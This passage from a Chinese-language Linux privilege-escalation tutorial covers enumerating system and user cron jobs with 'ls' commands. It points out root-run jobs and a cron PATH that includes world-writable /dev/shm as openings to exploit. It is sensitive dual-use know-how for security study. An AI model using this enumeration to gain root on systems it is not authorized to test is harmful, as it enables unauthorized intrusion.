d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113615284-1805938708-e9eee47a2a57c43c9a052977e4a9e5b1.png" width="861" height="461" class="img_ev3q"></p>
<p>这里我们可以看到这个主机上有四个 cron 作业正在运行。</p>
<p>前三个任务每分钟运行一次，最后一个任务每五分钟运行一次，所有 cron 任务都以 root 身份运行。</p>
<p>此外，我们还可以看到 cron PATH 已被编辑为包含 <strong>/dev/shm</strong>，这是一个所有人都可以写入的文件夹。</p>
<p>我们通常会在 crontab 文件中找到自定义的 cron 作业；不过，如前所述，还可以在其他目录执行这些作业。</p>
<p>如果我们在 crontab 文件中没有找到任何 cron 作业，或者这些作业无法被利用，我们可以使用以下命令检查所有 cron 目录中的自定义作业：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ls -l /etc/cron*</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113645562-245687771-0ae8257f4b173fa0c5d298ab435e79b4.png" width="529" height="591" class="img_ev3q"></p>
<p>在这里，我们可以看到可以执行 cron 作业的所有五个附加目录。遗憾的是，在这些目录中都没有找到自定义的 cron 作业，上面这些都是默认情况下在这些目录中最常见的标准作业。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="22枚举用户-cron-作业"><strong><div id="id2.2">2.2、枚举用户 Cron 作业</div></strong><a href="#22枚举用户-cron-作业" class="hash-link" aria-label="22枚举用户-cron-作业的直接链接" title="22枚举用户-cron-作业的直接链接">​</a></h4>
<p>上面我们已经枚举了所有的系统 crontab，下面我们可以枚举用户的 crontab（即 隐藏的 cron 作业）。</p>
<p>正如文章前面提到的，标准用户甚至无法访问存储用户 cron 作业的目录。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ls -l /var/spool/cron/crontabs</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113555694-1648732905-dfa8caa774cff357190951743eebe050.png" width="586" height="47" class="img_ev3q"></p>
<p>当我们检查 /var/spool/cron 文件夹权限时，我们就能明白原因。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ls -l /var/spool/cron | grep &quot;crontabs&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="557" height="45" class="img_ev3q"></p>
<p>这里我们可以看到该文件的所有者是 root 组是 crontab 。由于我们两者都不是，所以我们属于第三组，且该组只设置了“粘性位”，用“T”表示。</p>
<blockquote>
<p>粘滞位是在文件或目录上设置的权限位，只允许文件/目录的所有者或根用户删除或重命名该文件。</p>
</blockquote>
